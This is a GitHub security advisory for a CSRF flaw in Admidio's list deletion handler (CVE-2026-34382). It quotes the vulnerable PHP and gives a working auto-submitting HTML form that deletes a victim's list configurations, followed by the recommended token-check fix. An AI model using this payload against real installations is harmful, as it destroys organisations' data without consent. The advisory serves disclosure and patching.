# [M] Admidio has Missing CSRF Protections on Custom List Deletion in mylist_function.php

## Summary
Severity: Medium
Advisory: GHSA-g3mx-8jm6-rc85
CVE: CVE-2026-34382
CWE: CWE-352
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:L (CVSS_V3)
Published: 2026-03-31
Source: https://github.com/advisories/GHSA-g3mx-8jm6-rc85
Type: github-advisory

## Affected
- Packagist: `admidio/admidio` — affected >=5.0.0 <5.0.8

## Details
**Reported by:** Juan Felipe Oz [@JF0x0r](https://x.com/PwnedRar_)
> [LinkedIn](https://www.linkedin.com/in/juanfelipeoz/)

### Summary

The `delete` mode handler in `mylist_function.php` permanently deletes list configurations without validating a CSRF token. An attacker who can lure an authenticated user to a malicious page can silently destroy that user's list configurations — including organization-wide shared lists when the victim holds administrator rights.

### Vulnerable Code
File: `modules/groups-roles/mylist_function.php`

The CSRF token validation at lines **81–82** is scoped exclusively to the save, save_as, and save_temporary modes:

```php
// Line 81-82 — only runs for save modes
$categoryReportConfigForm = $gCurrentSession->getFormObject($_POST['adm_csrf_token']);
if ($_POST['adm_csrf_token'] !== $categoryReportConfigForm->getCsrfToken()) {
    throw new Exception('Invalid or missing CSRF token!');
}
```

<img width="857" height="162" alt="imagen" src="https://github.com/user-attachments/assets/caec390e-ba6f-40f0-bb9c-a8870679da3d" />

The `delete` case at lines **159–161** executes the destructive operation with no token check:

```php
} elseif ($getMode === 'delete') {
    // delete list configuration
    $list->delete();  // no CSRF validation
    echo json_encode(array('status' => 'success', ...));
    exit();
}
```

<img width="560" height="133" alt="imagen" src="https://github.com/user-attachments/assets/2d5eff8e-bbce-49b9-b6d5-77f4e2e6db69" />

A global input guard at lines **40–48** requires a non-empty `column[]` POST parameter for all modes including `delete`. This guard serves no security purpose for deletion, it exists for save validation but it must be satisfied to reach the delete handler. Any static value such as `LAST_NAME` is sufficient.

### Impact

Any authenticated user with list edit permission can be targeted. Admidio ships with six organization-wide shared lists (`lst_global = 1`): Address list, Phone list, Contact information, Membership, Members, and Contacts. When an administrator is the CSRF victim, these global lists are permanently deleted affecting all members of the organization. There is no soft-delete or recovery mechanism.

---

### Proof of Concept

> First my video PoC, after that, the proof of concept with detail. 

[Watch Video](https://drive.google.com/file/d/1wEdTIH7O0PvlnyjR2I_VpcAl3tvr6saA/view?usp=sharing)

* Prerequisites: Victim is authenticated in Admidio. Attacker knows the target list UUID (visible in the page URL at modules/groups-roles/mylist.php?list_uuid=...)

1. Step 1: Attacker serves this page from any HTTP origin:

```html
<!DOCTYPE html>
<html>
<body>
  <form id="f" method="POST"
    action="http://TARGET/modules/groups-roles/mylist_function.php?mode=delete&list_uuid=TARGET_UUID">
    <input type="hidden" name="column[]" value="LAST_NAME">
  </form>
  <script>document.getElementById('f').submit();</script>
</body>
</html>
```

> Since browsers block CSRF files, I did the proof of concept by setting up a local server with Python on the 9090. ok? 

2. Step 2: Victim visits the attacker page while logged into Admidio.
3. Step 3: Server responds immediately:

```json
{"status":"success","url":".../modules/groups-roles/mylist.php"}
```

4. Step 4: List is permanently deleted. Verified via:
```sql
SELECT lst_name FROM adm_lists WHERE lst_uuid='TARGET_UUID';
-- Empty result set
```
> No `adm_csrf_token` field is required anywhere in the request.

### Recommendation Fix: 

> It's so simple. 

* Apply the same `SecurityUtils::validateCsrfToken()` pattern already used in the save modes:

```php
} elseif ($getMode === 'delete') {
    SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);
    $list->delete();
    echo json_encode(array('status' => 'success', ...));
    exit();
}
```

Additionally, the `column[]` input guard at lines **40–48** should be moved inside the `in_array($getMode, ['save', 'save_as', 'save_temporary'])` block, since delete requires no column data and the guard currently forces attackers to include a trivially satisfiable dummy value.

<img width="751" height="240" alt="imagen" src="https://github.com/user-attachments/assets/607510b9-64a9-49fb-8806-604b651d31a8" />

## References
- https://github.com/Admidio/admidio/security/advisories/GHSA-g3mx-8jm6-rc85
- https://nvd.nist.gov/vuln/detail/CVE-2026-34382
- https://github.com/Admidio/admidio/commit/317ec91ad3baf19d4179db6c32413812eb36d7ca
- https://github.com/Admidio/admidio
